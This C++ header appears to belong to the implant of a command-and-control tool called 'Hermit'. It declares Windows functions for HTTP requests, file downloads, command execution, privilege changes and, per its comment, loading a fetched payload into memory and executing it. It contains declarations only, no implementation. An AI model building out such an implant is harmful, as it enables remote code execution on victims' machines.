#ifndef HERMIT_CORE_SYSTEM_HPP
#define HERMIT_CORE_SYSTEM_HPP

#include <windows.h>
#include <winhttp.h>
#include <fstream>
#include <iterator>
#include <sstream>
#include <string>
#include <strsafe.h>
#include <vector>
#include "core/macros.hpp"
#include "core/stdout.hpp"
#include "core/utils.hpp"

namespace System::Arch
{
    std::wstring GetName(WORD wProcessorArchitecture);
}

namespace System::Env
{
    std::wstring GetStrings(const std::wstring& envVar);
}

namespace System::Fs
{
    VOID CALLBACK FileIOCompletionRoutine(
        DWORD dwErrorCode,
        DWORD dwNumberOfBytesTransfered,
        LPOVERLAPPED lpOverlapped
    );

    struct MyFileData {
    LPVOID lpData;
    DWORD dwDataSize;
    };

    std::vector<char> ReadBytesFromFile(const std::wstring& wFilePath);
    BOOL MyWriteFile(const std::wstring& wFile, LPCVOID lpData, DWORD dwDataSize);
}

namespace System::Http
{
    VOID WinHttpCloseHandles(
        HINTERNET hSession,
        HINTERNET hConnect,
        HINTERNET hRequest
    );

    struct WinHttpHandlers {
        HINTERNET hSession;
        HINTERNET hConnect;
    };

    WinHttpHandlers InitRequest(LPCWSTR lpHost, INTERNET_PORT nPort);

    struct WinHttpResponse {
        BOOL bResult;
        HINTERNET hRequest;
        DWORD dwStatusCode;
    };

    WinHttpResponse SendRequest(
        HINTERNET hConnect,
        LPCWSTR lpHost,
        INTERNET_PORT nPort,
        LPCWSTR lpPath,
        LPCWSTR lpMethod,
        LPCWSTR lpHeaders,
        LPVOID lpData,
        DWORD dwDataLength
    );

    // It's used for reading small text from responses.
    std::wstring ReadResponseText(HINTERNET hRequest);

    // It's used for reading large data from responses.
    // The data is saved at 'sFile'.
    BOOL ReadResponseData(HINTERNET hRequest, const std::wstring& outFile);

    // It's used for loading another payload into memory
    // and execute it.
    BOOL ReadResponsePayload(HINTERNET hRequest);

    BOOL DownloadFile(
        HINTERNET hConnect,
        LPCWSTR lpHost,
        INTERNET_PORT nPort,
        LPCWSTR lpPath,
        const std::wstring& wSrc,
        const std::wstring& wDest
    );
}

namespace System::Priv
{
    BOOL CheckPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege);
    BOOL SetPrivilege(
        HANDLE hToken,
        LPCTSTR lpszPrivilege,
        BOOL bEnablePrivilege
    );
}

namespace System::Process
{
    std::wstring ExecuteCmd(const std::wstring& cmd);
    BOOL ExecuteFile(const std::wstring& filePath);
}

#endif // HERMIT_CORE_SYSTEM_HPP